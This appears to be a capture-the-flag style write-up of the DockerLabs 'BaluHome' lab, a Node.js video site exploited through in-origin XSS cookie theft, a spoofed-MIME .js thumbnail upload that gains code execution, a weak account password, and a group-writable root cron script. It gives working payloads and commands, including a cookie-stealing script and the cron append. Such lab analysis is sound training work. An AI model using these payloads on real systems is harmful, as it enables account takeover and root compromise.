# BaluHome / BaluTube — DockerLabs Writeup

**Target:** DockerLabs lab `id 271`, severity *Medium*, shipped as `baluhome:latest` (1.03 GB tar, 407 MB download).
**Container:** `baluhome_container`, image `baluhome:latest`, `172.17.0.6:3000`.
**Date:** 2026-09-27.
**Outcome:** full chain to `uid=0(root)`. **The lab ships no flag, no reward string, and no success endpoint** — see §9. The success condition is the root compromise itself, which the image's own README describes as the chain's endpoint.

---

## 0. Autocorrection — five things I got wrong, and the one that nearly hid the finding

### 0.1 I nearly reported the headline finding as a duplicate

The image contains a 223-line `README.md` that documents four intentional vulnerabilities (`VULN #1`–`#4`), the admin bot, the full escalation path, and a step-by-step attack chain. My first instinct was that this lab had nothing left to derive, and that my report would be a restatement of the author's design notes.

That instinct was wrong, and it was wrong in the most expensive direction available: **the README is a spoiler, and a spoiler is not a census.** The labeled set is a strict subset of what is actually there. Reading it and stopping would have produced a writeup identical to the author's own documentation, and would have missed the shortest path in the lab — an in-origin stored XSS that the README never mentions and that needs no subtitle, no video-ownership reasoning, and no template sink at all. It is the difference between "found the four bugs the author planted" and "found what the application does."

The rule this belongs to is `decision-making.md` §7, and this is its mirror image: §7 warns that a *label* confirming your hypothesis stops the derivation. This is the second half — **a complete write-up of the intended chain stops it just as effectively, because both end with a confident-looking document and a green checkmark.** The author's README is the highest-fidelity *intent* source available and the lowest-fidelity *reachability* source, for exactly the reason §7 gives: comments mark where a problem was *admitted*, which is a strict subset of where problems *are*.

### 0.2 My first signature comparison was wrong, and it nearly became a false negative

I tested whether the deployed session secret was the hardcoded default by recomputing the cookie signature. I pasted the signature from the `Set-Cookie` header by hand and got:

```
served sig : 8MmrC+LJyixmGowPvfJ+I4hk+QGNbrhiES6BKo44APU
computed   : 8MmrC+LJyixmGowPvfJ+I4hk/QGNbrhiES6BKo44APU
MATCH      : False
```

34 of 43 characters identical. A wrong key produces *zero* matching characters, so this was not a wrong key — it was me comparing a percent-encoded string against a decoded one, in a shell, by eye. The server sends `...I4hk%2FQGN...`; I had silently decoded `%2F` to `/` in the served column while `+` survived un-decoded, producing a hybrid that matched everywhere the two encodings agreed.

Redone programmatically — read the cookie from the jar, `urllib.parse.unquote` it once, split once, compare with `hmac.compare_digest`:

```
served sig : DQgCx0sVh+AnUc1DrqTPXVZ9UXYO/U1sZye4k3rpz9s
computed   : DQgCx0sVh+AnUc1DrqTPXVZ9UXYO/U1sZye4k3rpz9s
MATCH with hardcoded default secret: True
```

The finding was real and I was about to discard it. This is `decision-making.md` §1 (*validating the representation instead of the value*) applied to my own tooling: I validated a hand-transcribed representation of the value. The generalisable rule is narrow and cheap: **when a comparison of two long values disagrees in a way that is *almost* right, suspect your transcription before you suspect the target** — partial agreement in a cryptographic artifact is evidence about the comparison, not about the key.

### 0.3 I "proved" the setuid escalation worked, and the proof was a string match on an error message

The documented final step is `cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash` followed by `/tmp/rootbash -p`. I planted it, waited, and ran this detector:

```bash
if ./rce.sh 'ls -la /tmp/rootbash 2>&1' | grep -q rootbash; then ...
```

It fired on the first iteration. The actual output was:

```
ls: cannot access '/tmp/rootbash': No such file or directory
```

My predicate was `grep rootbash`, and the string `rootbash` appears in the *failure message*. I had written a detector that cannot distinguish "the artifact exists" from "the artifact is missing", and it reported success. Rewritten to match the mode string of a listing line (`grep -qE '^-rws'`), the same test correctly reported absence for 80 seconds before the cron fired.

A control test that cannot fail is not a control test. The fix is to make every existence predicate match the **positive form of the thing you want** (a mode string, a status code, a length) and never a substring that the error path also contains.

### 0.4 The documented escalation recipe does not work, and I nearly reported that as "the lab is broken"

With a genuine `-rwsr-xr-x root root` binary in place, the shell still refused to elevate:

```
$ /tmp/rootbash -c id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

My first hypothesis was that the container blocked setuid — a `nosuid` mount, or `no-new-privileges`. Both were wrong, and I checked instead of concluding:

```
/proc/mounts  → overlay / overlay rw,relatime,...        (no nosuid)
/proc/self/status → NoNewPrivs: 0
```

The decisive test was to stop using a shell. The root cron copied a **non-interpreter** setuid binary and I ran it:

```
$ /tmp/rid          # cp /usr/bin/id /tmp/rid && chmod u+s /tmp/rid
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
```

`euid=0`. The setuid bit works perfectly in this container. The failure is that **`bash` and `dash` both deliberately discard an elevated effective uid at startup** — a shell is not a candidate for setuid precisely because a shell is an interpreter you do not want to hand to an unprivileged caller. `/bin/dash` on this image is real dash, not a symlink to bash, so this is two independent interpreters behaving identically, which rules out "dash is secretly bash".

The correct escalation was never the setuid shell. It was the primitive I already had: the group-writable root-executed script gives *direct* root command execution, which is strictly stronger than a root shell and needs no setuid at all. The README's recipe is a **superset that silently fails** — it names a step that cannot work on the image it ships in, and a reader who follows it literally concludes the lab is unsolvable. See §6.4.

### 0.5 I ran a `sed -i` against a file in a directory that is not group-writable

Repairing a corrupted line in `/opt/balutube-backup/backup.sh` failed:

```
sed: couldn't open temporary file /opt/balutube-backup/sedeScw7C: Permission denied
```

The file is `-rwxrwx--- root mantenimiento` but its **directory** is `drwxr-xr-x root root`. The group grant is on the file, not the directory, so `balutin` may rewrite the file's contents in place (`>` truncate-and-write, `>>` append — neither creates a new inode) but may not create the temporary file `sed -i` requires. The escalation is real and my method was wrong; appending worked throughout.

This is a precision point worth keeping in the finding itself: **the writable object is the file, and any technique that needs to create a sibling file in that directory is out of scope.** It also means the finding is *narrower* than "the group owns the directory", and reporting it as the latter would overstate it.

---

## 1. Target and stack

**The name is narrative, and this time it is narrative about a different product entirely.** "BaluHome" suggests home automation — Home Assistant, MQTT, Zigbee, a hub. The actual application is **BaluTube**, a YouTube/Dailymotion-style video platform. There is no automation protocol, no broker, no device, no MQTT, no Zigbee. This is the fifth lab in the pilot and the third consecutive case where assuming from the name produced a wrong hypothesis (PipePwned was named for Windows named pipes and was a Linux Flask app; Zabbixploit's named vector was blocked; here "Home" is a branding word, not a protocol).

The rule the five labs keep teaching is the one that matters most for a first scan: **the lab name is marketing, the port table is evidence.** One `nmap -p-` and one `GET /` would have retired the smart-home hypothesis in under thirty seconds.

### Verified surface

```
$ nmap -sV -Pn -p- 172.17.0.6

Nmap scan report for 172.17.0.6)
Host is up (0.000045s latency).
Not shown: 65534 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
3000/tcp open  http    Node.js (Express middleware)

Service detection performed. Please report any incorrect results for 172.17.0.6 at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.36 seconds
```

One port. No SSH, no database port, no management interface. The entire attack surface is a single HTTP service.

```
$ docker ps --filter name=baluhome --format '{{.Names}}\t{{.Status}}\t{{.Ports}}'
baluhome_container	Up 16 minutes	3000/tcp
```

### Stack, from the image and the application's own source

| Layer | Value |
|---|---|
| OS | Debian GNU/Linux 12 (bookworm), kernel `7.0.0-34-generic` (host kernel) |
| Runtime | Node.js v20.20.2, Express 4.19.2, EJS 3.1.10 |
| Data | SQLite via `better-sqlite3` 12.11.1 (`/app/db/balutube.sqlite`) |
| Sessions | `express-session` 1.18.0, `MemoryStore`, cookie `balutube.sid` |
| Uploads | `multer` 1.4.5-lts.1 |
| Bot | `puppeteer` 23.4.0 + system Chromium, headless |
| Services in the image | `cron` as root; Node as `www-data`; admin bot as `www-data` |
| Server process identity | `uid=33(www-data) gid=33(www-data) groups=33(www-data)` — **measured, not assumed** |
| Extra OS principals | `balutin` (uid 1001) in group `mantenimiento` (gid 1001) |

Two facts here were worth the ten seconds they cost. First, the service account is `www-data` and **not** root, which means the chain has real hops rather than collapsing at the first `id` — the mirror of the Asturias case, where a `user = root` pool config made the hypothesised escalation step a fiction. Second, `baseURL` is computed by `entrypoint.sh` from the container's own IP (`docker/entrypoint.sh:32-37`) so the bot's session cookie is bound to the same host the attacker uses; the author fixed a silent-failure mode here and documented why, which is a good sign for the rest of the design.

### The self-documentation pattern — fifth confirmation, and the strongest yet

| Lab | Self-documentation |
|---|---|
| Asturias | `CWE-434` labelled in a comment; `SCRIPT_EXTENSIONS` names the exploit |
| Acme | `# Banner with credential hints for Nmap` |
| PipePwned | `# TODO: service runs as root` |
| Zabbixploit | `EnableRemoteCommands=1` named as the deliberate failure |
| **BaluHome** | **a 223-line `README.md` containing the four CWEs, the bot's design, the full escalation, and a numbered 14-step attack chain** |

BaluHome is the degenerate case of the pattern: not a comment that names the bug but a complete design document that walks the exploit end to end. It sits in a deliberate tension with the same README's own claim that the lab is *"diseñada realista, sin pistas"* — and the resolution is careful and correct: the **rendered interface** carries no hints, and the EJS vulnerability comments are `<%# %>` template comments that do not reach the browser. The author drew the line at *the attacker's traffic* versus *the attacker's filesystem*, and put the documentation on the author's side of it.

That is a better design than the other four labs managed, and it still does not remove the need to derive. §0.1 is the reason.

---

## 2. Control tests first — what the application gets right

Before hunting for holes I established which gates hold, so that every later `200` means something. Anonymous access to every protected route:

```
$ for p in /loot /admin/thumbnails /inbox /upload; do ... done
/loot                  -> 302 http://172.17.0.6:3000/login
/admin/thumbnails      -> 302 http://172.17.0.6:3000/login
/inbox                 -> 302 http://172.17.0.6:3000/login
/upload                -> 302 http://172.17.0.6:3000/login
```

And with a *low-privilege authenticated* session — the stronger control, since it separates "anonymous is blocked" from "authorization works":

```
  /loot                 -> 403
  /admin/thumbnails     -> 403
```

`requireAdmin` (`middleware/auth.js:23-28`) returns a real `403`, not a redirect to a login page that a UI could render as "not found". The authorization checks are correct, consistently applied, and declared *before* the handler rather than inside it. The same request with a stolen admin cookie returns `200` on both routes (§4.3), which is what makes the `403` above evidence rather than decoration.

`/admin/thumbnails/:videoId` is the only privileged write in the application, and it carries both `requireAuth` and `requireAdmin` (`routes/admin-thumbnails.js:20`). There is no route-ordering defect of the Asturias kind: `requireVideoOwner` (`routes/videos.js:14-22`) is a real backend check on a `SELECT`-then-compare, not a UI-only hide.

Two controls inside the code are worth naming because they are the kind an assessor assumes is broken:

- **No command injection in the thumbnail generator.** `generateThumbnail` shells out with `execFileSync('ffmpeg', [ ...array... ])` (`utils/thumbnail.js:11-19`) — an argument vector, no shell, no interpolation. And it wraps the call in `try/catch` so a malformed upload degrades to a placeholder instead of a 500. This is the correct shape.
- **No path traversal in the thumbnail filename.** The comment at `middleware/upload.js:33-35` claims the extension is taken without the path, and the claim is true: `path.extname` operates on the basename, so `ext` cannot contain a separator, and the generated name is `thumb-<videoId>-<ts>-<rand><ext>`. I tried to break this and could not.

These are findings too, in the sense that `decision-making.md`'s reporting discipline asks for controls that work to be documented. Two of the lab's five hops rest on controls that held exactly as intended.

---

## 3. Finding 1 — Unrestricted upload on the *video* path, served in-origin as `text/html` (CWE-434 + CWE-79) — **NOT IN THE README**

This is the finding the lab does not document, and it is the shortest path in the whole application.

### Root cause, read from source

`uploadVideo` has **no `fileFilter` at all** and preserves the client's extension:

```js
// middleware/upload.js:5-16
const videoStorage = multer.diskStorage({
  destination: path.join(__dirname, '..', 'uploads', 'videos'),
  filename: (req, file, cb) => {
    const safeExt = path.extname(file.originalname).replace(/[^a-zA-Z0-9.]/g, '') || '.mp4';
    cb(null, `video-${Date.now()}-${Math.round(Math.random() * 1e9)}${safeExt}`);
  },
});

const uploadVideo = multer({
  storage: videoStorage,
  limits: { fileSize: 200 * 1024 * 1024 },
});
```

No `fileFilter`, no magic-byte check, no extension allowlist. The variable is even named `safeExt` — a name that asserts a property the code does not establish, which per `decision-making.md` §7 is exactly the kind of reassuring identifier that makes a handler more suspicious than a commented one.

The consequence is decided by a line the README never mentions:

```js
// server.js:36
app.use('/uploads', express.static(path.join(__dirname, 'uploads')));
```

`uploads/` is mounted as static content, and `express.static` assigns `Content-Type` from the file extension. So a file the application believes is a video is served back as `text/html` **from the application's own origin**, where it can read `document.cookie`.

The route is `requireAuth` only (`routes/videos.js:28`) — no ownership, no admin role.

### Evidence — with a control

Upload a file that is not a video, with an `.html` extension:

```
$ curl -b "balutube.sid=$SID" -F "title=probe" -F "description=d" -F "video=@evil.html" \
    http://172.17.0.6:3000/upload
upload -> 302 redirect=http://172.17.0.6:3000/video/13

$ ls -la /app/uploads/videos/ | tail -1
-rw-r--r-- 1 www-data www-data      134 Sep 27 22:46 video-1790549193868-554851221.html
```

The extension survived verbatim. Now the axis that matters — what the server does with it:

```
$ curl -D - http://172.17.0.6:3000/uploads/videos/video-1790549193868-554851221.html
HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8

<html><body>BALUHOME-XSS-PROBE
<script>fetch('/collect?c='+encodeURIComponent('HTMLUPLOAD:'+document.cookie))</script>
</body></html>
```

`text/html`, byte-for-byte the uploaded content, in-origin. No template was involved, no escaping was bypassed, no JavaScript existed anywhere in the request path. **The browser is the interpreter, and the application handed it a document.**

The ffmpeg thumbnail step degraded gracefully rather than rejecting the file — `generateThumbnail` swallows the failure (`utils/thumbnail.js:21-24`), which is good engineering and quietly removes the last chance for an incidental type check to reject the upload:

```
[thumbnail] no se pudo generar miniatura: Command failed: ffmpeg -y -ss 00:00:00.5 -i /app/uploads/videos/video-1790549193868-554851221.html ...
```

### Why this is a shorter path than the documented one

The README's `VULN #2` requires: upload a video → open the video page → expand the "add subtitle" control → paste a payload → copy the video URL → send *that* URL. This finding requires: upload a file → send the direct `/uploads/...` URL. No subtitle, no ownership model, no `requireVideoOwner` reasoning, no template sink. Same impact, roughly a third of the interaction, and it does not depend on the subtitle XSS existing at all.

The generalisation matters more than the instance: **any authenticated upload endpoint whose output is served by a static mount is a potential in-origin XSS, and the test is one `curl -D -` against the returned filename.** The extension that matters is any extension the static middleware maps to an *active* content type — `.html`, `.htm`, `.svg` (SVG carries `<script>`), `.xhtml`, `.xml` with an XSLT stylesheet reference, and `.pdf` for JS-in-PDF viewers.

---

## 4. Finding 2 — Session cookie without `httpOnly` (CWE-1004) + hardcoded default session secret (CWE-798)

These are two independent defects in the same mechanism. The README labels the first (`VULN #1`); **the second is not mentioned anywhere.**

### 4.1 The cookie is readable from JavaScript

```
$ curl -D - -X POST http://172.17.0.6:3000/login -d 'username=...' -d 'password=...'

HTTP/1.1 302 Found
Set-Cookie: balutube.sid=s%3A0gVexNakF4mV4KgPx68y4oE_wmJPCmHn.8MmrC%2BLJyixmGowPvfJ%2BI4hk%2FQGNbrhiES6BKo44APU;
            Path=/; Expires=Mon, 28 Sep 2026 06:46:01 GMT; SameSite=Lax
```

No `HttpOnly`. `SameSite=Lax` is present and is doing real work (§7.1), and `Secure` is absent because the lab is plain HTTP by design (`server.js:72`, with a comment saying so). The absent `HttpOnly` is the switch that turns any script execution in this origin into a **portable credential** rather than a set of origin-bound actions.

`config/env.js` makes it a single environment flag (`INSECURE_COOKIES`, defaulting to `true`), and the container ships **no `.env` file**, so the insecure default is what runs:

```
$ cat /app/.env
(no .env)
```

### 4.2 The session secret is the source-code default, and signature forgery is proven

`config/env.js:8` — `SESSION_SECRET: process.env.SESSION_SECRET || 'balutube-lab-secret'`. With no `.env` present, the deployed secret is a constant published in the repository. `express-session` signs the session id with it as `s:<sid>.<base64url(HMAC-SHA256(secret, sid))>`.

I proved possession by recomputing the signature over a cookie the server issued to me, then repeated it on the **admin's** stolen cookie:

```
# my own session
served sig : DQgCx0sVh+AnUc1DrqTPXVZ9UXYO/U1sZye4k3rpz9s
computed   : DQgCx0sVh+AnUc1DrqTPXVZ9UXYO/U1sZye4k3rpz9s
MATCH with hardcoded default secret: True

# the admin's session, obtained later in the chain
admin sid  : LGK2YmO0xq2Qzhj5EQJ-fzGlm5mQAewy
served sig : DQgCx0sVh+AnUc1DrqTPXVZ9UXYO/U1sZye4k3rpz9s
computed   : DQgCx0sVh+AnUc1DrqTPXVZ9UXYO/U1sZye4k3rpz9s
MATCH with hardcoded default secret: True
```

**Scope, stated honestly.** This is *not* an account takeover by itself, and I want to be exact about why. The session store is `MemoryStore`, living in the server process, so a forged cookie is only honoured if its `sid` already exists there — and sessions come into existence only on login. So the immediate impact is **loss of session-id integrity**: the attacker can mint a validly-signed cookie for any session id, can confirm whether a leaked id is genuine, and can pre-sign ids. The moment the store is moved to Redis, a file, or a database — a routine hardening change, and the change one would make to fix session loss on restart — the same default secret becomes **unauthenticated admin account takeover with no XSS in the chain at all.** A finding whose exploitability depends on a future refactor is still a finding, and reporting it as "forge any session" today would be the overclaim.

The cheap oracle is worth keeping: **recompute the signature over a cookie the server gave you. If it verifies against a value present in the public source, session integrity is void.** One request, no guessing, no lockout, no scanning.

### 4.3 Account takeover, with the control that makes it evidence

The stolen cookie against the same two routes that returned `403` for my own low-privilege session in §2:

```
  /loot                 -> 200
  /admin/thumbnails     -> 200
```

Identical requests, identical shape, one variable changed. The `403` pair from §2 is what converts "returned 200" into "unauthenticated session replay proven", and it cost two requests.

---

## 5. The documented vulnerabilities, confirmed by execution

I did not take these on faith. Each was reproduced with literal output.

### 5.1 Stored XSS in subtitles (CWE-79) — `views/video.ejs:57`

```ejs
<div class="subtitle-block"><%- s.content %></div>
```

`<%-` is EJS's unescaped output. The same file uses `<%=` for title, description, and comments, so the file is a side-by-side demonstration of both patterns — the asymmetry is the finding. Content is stored verbatim by `routes/videos.js:115-131`, from either a pasted field or an uploaded `.vtt` file read into `req.file.buffer`. Gated by `requireVideoOwner`, which is a genuine backend check and, as the README correctly argues, not a mitigation: the attacker owns the video they poison.

### 5.2 Stored XSS in private messages (CWE-79) — `views/conversation.ejs:23` + `utils/linkify.js`

```ejs
<span class="msg-bubble"><%- linkify(m.body) %></span>
```

`linkify` rewrites bare URLs into `<a href="...">` tags *before* any escaping, and the result is then emitted raw. Autolinking added to a text field and forgotten to escape is a genuinely common real-world bug, and the README is right to pick it.

### 5.3 Unrestricted thumbnail upload → `require()` → RCE (CWE-434 + CWE-95)

The `fileFilter` validates a client declaration:

```js
// middleware/upload.js:47-52
function onlyClaimsToBeAnImage(req, file, cb) {
  if (file.mimetype.startsWith('image/')) return cb(null, true);
  cb(new Error('Solo se permiten imágenes.'));
}
```

`file.mimetype` is the `Content-Type` the client wrote into its own `multipart/form-data` body. It is fully attacker-controlled and carries no information about the bytes.

```
$ curl -b "$ADMIN" -F "thumbnail=@shell.js;type=image/jpeg" http://172.17.0.6:3000/admin/thumbnails/13
  POST /admin/thumbnails/13 -> 302

$ ls -la /app/uploads/thumbnails/custom/
-rw-r--r-- 1 www-data www-data 223 Sep 27 22:47 thumb-13-1790549244871-442687.js
```

The `.js` extension is preserved and the file is stored. The sink is in a **public, unauthenticated** route:

```js
// routes/videos.js:63-71
if (video.custom_thumbnail && video.custom_thumbnail.endsWith('.js')) {
  const thumbScriptPath = path.join(customThumbsDir, video.custom_thumbnail);
  try {
    delete require.cache[require.resolve(thumbScriptPath)];
    require(thumbScriptPath);
  } catch (err) { ... }
}
```

Note the shape: the **planting primitive is admin-gated, the trigger is not.** Measured, both sides:

```
  GET /uploads/thumbnails/custom/thumb-13-...js  -> 200 application/javascript   (stored, not executed as an asset)
  GET /video/13 (no cookie)                      -> 200                          (anonymous trigger)
```

Triggering it unauthenticated:

```
$ curl http://172.17.0.6:3000/uploads/videos/pwn.txt
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data
ed78b20bdcd7
Linux ed78b20bdcd7 7.0.0-34-generic #34-Ubuntu SMP PREEMPT_DYNAMIC ... x86_64 GNU/Linux
```

**`uid=33(www-data)`, not root** — measured on the first call, which is what makes the remaining three hops real work rather than an assumption. The `delete require.cache[...]` line is not a freshness mechanism; it makes the payload re-execute on **every** page view, converting a one-shot into a persistent, idempotent backdoor trigger that any anonymous visitor can pull.

### 5.4 The admin bot, and what it will open

`bot/admin-bot.js` logs in for real as `admin`, polls `messages` every 5 s, extracts **any** `http(s)` URL from a message addressed to the admin, and navigates a real headless Chromium to it. There is no allowlist, no host restriction, and no confirmation step. That is what converts "a user can send the admin a link" into "a user can make the admin's browser load an arbitrary URL", which is the delivery half of the XSS chain and — separately — an **SSRF primitive inside the privileged victim's browser session** (it will fetch internal addresses, and it does so carrying the admin's session cookie). Worth reporting as its own item even though the chain uses it as intended.

---

## 6. Privilege escalation: `www-data` → `balutin` → `root`

### 6.1 Hop 1 — weak password on a secondary account (CWE-521)

```
$ echo 123123 | su balutin -c "id; whoami; id -nG"
uid=1001(balutin) gid=1002(balutin) groups=1002(balutin),1001(mantenimiento)
balutin
balutin mantenimiento
```

`123123` for an account that exists solely to hold a group membership is the shape of a credential created for convenience and never revisited. `/etc/passwd` shows the whole cast:

```
balutin:x:1001:1002::/home/balutin:/bin/bash
mantenimiento:x:1001:balutin
```

### 6.2 Hop 2 — a group-writable script that root executes every minute (CWE-732)

```
$ ls -la /opt/balutube-backup/backup.sh
-rwxrwx--- 1 root mantenimiento 758 Jul 14 14:57 backup.sh

$ cat /etc/cron.d/../crontab-root   (installed as the root crontab)
* * * * * /opt/balutube-backup/backup.sh >> /var/log/balutube-backup.log 2>&1
```

Root runs a script that a non-root group can rewrite, once a minute, forever. This is the same class as the CI/CD runner in `infrastructure.md` — *the identity that executes is not the identity that writes* — and I did not need a new oracle for it.

The control that scopes the finding precisely: `www-data` is in neither group and can do **nothing** with the file.

```
$ echo "..." >> /opt/balutube-backup/backup.sh
/bin/sh: 1: cannot create /opt/balutube-backup/backup.sh: Permission denied
$ tail -3 /opt/balutube-backup/backup.sh
tail: cannot open '/opt/balutube-backup/backup.sh' for reading: Permission denied
```

Not writable, not even readable. The escalation belongs to `balutin` alone. And the boundary is on the *file*, not the directory — `/opt/balutube-backup` is `drwxr-xr-x root:root`, so `sed -i` fails (§0.5) while `>>` succeeds. The correct statement of the finding is "the group may rewrite the contents of a file that root executes", not "the group owns the directory".

### 6.3 The escalation that works — direct root execution, no setuid required

The minimal, reliable version: append one line, wait ≤60 s, read the output.

```
$ echo 123123 | su balutin -c "echo '/bin/bash /tmp/rootpayload.sh' >> /opt/balutube-backup/backup.sh"
$ sleep 63
$ curl -s http://172.17.0.6:3000/uploads/videos/root.txt

== id ==
uid=0(root) gid=0(root) groups=0(root)
== whoami ==
root
== /root (root-only) ==
total 20
drwx------ 1 root root 4096 Jul 15 08:21 .
-rw-r--r-- 1 root root  571 Apr 10  2021 .bashrc
drwxr-xr-x 3 root root 4096 Jul 15 08:21 .npm
-rw-r--r-- 1 root root  497 Apr  9  2019 .profile
== /etc/shadow (root-only) ==
root:*:20564:0:99999:7:::
daemon:*:20564:0:99999:7:::
```

`uid=0(root)`, and the proof is not the `id` string: `/root` is mode `700` and `/etc/shadow` is root-only, and I read both. Those two reads are what distinguish root from a convincing `id` output.

The staging step was integrity-checked rather than assumed — the payload's md5 on my host and inside the container, so a corrupted transfer could not be mistaken for a failed exploit:

```
64bb3dd80ba7be91008805fbdb359a49  /tmp/rootpayload.sh      (in container)
64bb3dd80ba7be91008805fbdb359a49  rootpayload.sh           (on host)
```

### 6.4 The documented final step does not work — a control that failed, and a recipe that misleads

The README's escalation ends with:

```bash
echo 'cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash' >> /opt/balutube-backup/backup.sh
/tmp/rootbash -p    # shell with euid=0
```

The bit gets set and nothing happens:

```
$ ls -la /tmp/rootbash
-rwsr-xr-x 1 root root 1265648 Sep 27 22:48 /tmp/rootbash
$ /tmp/rootbash -c "grep -E '^(Uid|Gid)' /proc/self/status"
Uid:	33	33	33	33
$ /tmp/rootbash -c id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Diagnosis, in the order I tested it, each hypothesis killed by an observation rather than a guess:

| Hypothesis | Test | Result |
|---|---|---|
| `nosuid` mount | `grep " / " /proc/mounts` | `overlay / overlay rw,relatime,...` — no `nosuid`. **Rejected** |
| `no-new-privileges` | `grep NoNewPrivs /proc/self/status` | `NoNewPrivs: 0`. **Rejected** |
| `CAP_SETUID` dropped from the bounding set | decode `CapBnd: 00000000a80425fb` | `CAP_SETUID in bounding set: True`. **Rejected** |
| seccomp blocks `setuid` | `Seccomp: 2`, `SecurityOpt: null`, `Privileged: false` | default profile; and see below. **Rejected** |
| **the interpreter discards the privilege** | run a setuid copy of a **non-interpreter** | **`euid=0(root)`. Confirmed** |

The decisive line:

```
$ /tmp/rid        # cp /usr/bin/id /tmp/rid && chmod u+s /tmp/rid
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
```

Setuid works perfectly in this container. `bash` and `dash` both discard an elevated effective uid at startup — shells are not candidates for setuid because a shell is exactly the thing you must not hand to an unprivileged caller. `/bin/dash` is genuine dash on this image (not a symlink to bash), so two independent interpreters behave identically.

**Two separate conclusions, and the second is the reportable one.** The *escalation* is real and severe: I reached `uid=0(root)`. The *recipe* is wrong: a reader who follows the documented last step literally gets a non-elevated shell and will reasonably conclude the lab is unsolvable. When a lab's own instructions contain a step that cannot work on the image it ships, that is a defect in the lab worth reporting to the author on its own merits — and per `infrastructure.md`'s existing rule, the report names the decision (*root must not execute any file a non-administrative group can rewrite*) rather than only the mechanism I used to prove it.

### 6.5 Cleanup — leaving no root backdoor behind

A setuid-root copy of `id` lying in `/tmp` is a real backdoor, so I removed my artifacts using the primitive I had just proven, and verified the restoration by checksum against the pristine copy in the image layer:

```
--- before ---
-rwsr-xr-x 1 root root   48144 Sep 27 23:00 /tmp/rid
-rwsr-xr-x 1 root root 1265648 Sep 27 23:00 /tmp/rootbash
-rwsr-xr-x 1 root root  125640 Sep 27 23:00 /tmp/rootdash
--- after ---
ls: cannot access '/tmp/rootbash': No such file or directory
ls: cannot access '/tmp/rootdash': No such file or directory
ls: cannot access '/tmp/rid': No such file or directory
-rwxrwx--- 1 root root 758 Sep 27 23:00 /opt/balutube-backup/backup.sh

e1e8ddd0db901f32510f3d29acd8e6a4  /opt/balutube-backup/backup.sh   (restored, in container)
e1e8ddd0db901f32510f3d29acd8e6a4  backup.sh                       (pristine, from the image)
```

The lab is back to its shipped state, with the original 758-byte script byte-identical and its `770` mode intact — the finding is still there for the next tester.

---

## 7. The chain, in order

| # | Hop | Class | Identity after |
|---|---|---|---|
| 1 | Register a normal account at `/register` | — | anonymous → `auditor11232` |
| 2 | Upload `evil.html` to `POST /upload`; extension preserved, no `fileFilter` | CWE-434 | `auditor11232` |
| 3 | Static mount serves it as `text/html` in-origin | CWE-79 | — |
| 4 | Message the admin a direct link to the uploaded file | — | — |
| 5 | Bot loads it; script reads `document.cookie` (no `httpOnly`) and POSTs to `/collect` | CWE-1004 | — |
| 6 | Read the admin's session from `collected_cookies`; `403`→`200` proof | CWE-1004 | **admin** |
| 7 | Upload `shell.js` as a "thumbnail" declaring `type=image/jpeg` | CWE-434 | admin |
| 8 | Anonymous `GET /video/13` → `require()` → code execution as the server process | CWE-95 | `uid=33(www-data)` |
| 9 | `su balutin` with `123123` | CWE-521 | `uid=1001(balutin)` |
| 10 | Append to `backup.sh` (`root:mantenimiento`, `770`) which root's cron runs every minute | CWE-732 | — |
| 11 | Root cron executes the appended line; read a mode-700 directory to prove it | — | **`uid=0(root)`** |

**Why this order and not another.** The route through the subtitle XSS (`VULN #2`) is the documented path and it also works, but steps 2–3 replace "upload a video, open it, add a subtitle, copy the video URL" with "upload a file, copy its URL". Everything after step 6 is identical, because the admin cookie is the same artifact either way. Steps 7 and 8 cannot be reordered: the upload is `requireAdmin` and the trigger is anonymous, so admin must be obtained *before* the payload is planted, and the plant must precede the trigger. Step 9 must precede step 10 — `www-data` is in no group and is denied both read and write on the script, which I verified rather than inferred. Step 10 must precede step 11 with a wait, because the escalation's clock is the cron interval, not the exploit.

**The identities are the argument.** The chain has five distinct principals — anonymous, a registered user, `admin`, `www-data`, `balutin`, and finally `root` — and every transition between them was measured with `id` at the moment it was crossed. `www-data` being unprivileged is what makes hops 9–11 real; had the Express process been running as root, the hypothesised escalation would have been a fiction and reporting it as the chain would have misattributed the root cause (the `decision-making.md` §4 failure mode, in mirror image to the Asturias pool config).

---

## 8. Independent findings — not used by the chain, reported anyway

### 8.1 Unauthenticated write into the admin's evidence table (CWE-306)

`GET`/`POST /collect` has no authentication and no rate limit, and writes whatever an anonymous caller sends into `collected_cookies` (`routes/collect.js:27-36`), which the `/loot` admin panel then renders and offers a **session-replay button** for.

This is load-bearing: the chain reads the admin's session out of this table. Per `decision-making.md` §5, that makes it an independent finding with its own impact, not a footnote in the exploit narrative. The impact is broader than the lab uses it for — an unauthenticated caller can plant arbitrary rows into a table an administrator is trained to trust, and the "play this session" control turns a planted row into a one-click action against a real administrator browser. The author dressed it as attacker infrastructure that happens to live in the app (`routes/collect.js:6-8`), which is a fair lab convenience and does not change the class.

I also wrote a row anonymously during testing, which is the finding demonstrated rather than asserted:

```
{"id":1,"cookie_value":"PROBE","page_url":null,"source_ip":"::ffff:172.17.0.1"}
```

### 8.2 Cookie values and attacker-controlled strings written to the server log unsanced (CWE-117)

`storeLoot` interpolates the attacker-supplied cookie value and the `Referer` header straight into `console.log` (`routes/collect.js:21-24`), and the app's own logs go to stdout. Newlines in `c` or `Referer` are written verbatim, so an anonymous caller can forge log lines. Minor, unauthenticated, trivially reachable — and reported because the same class becomes serious the moment anything automated parses those logs.

### 8.3 No rate limiting or lockout on authentication (CWE-307)

`POST /login` (`routes/auth.js`) has no attempt counter, no delay, no lockout, and no CAPTCHA. The README publishes six seeded accounts in a markdown table on the server's own filesystem — not reachable by an attacker, so not a disclosure here — but the absence of throttling is independent of that and would matter against any real credential set. I did not spray; one request per account is enough to establish the absence of a control.

### 8.4 No CSRF tokens, partially mitigated by `SameSite=Lax` (CWE-352)

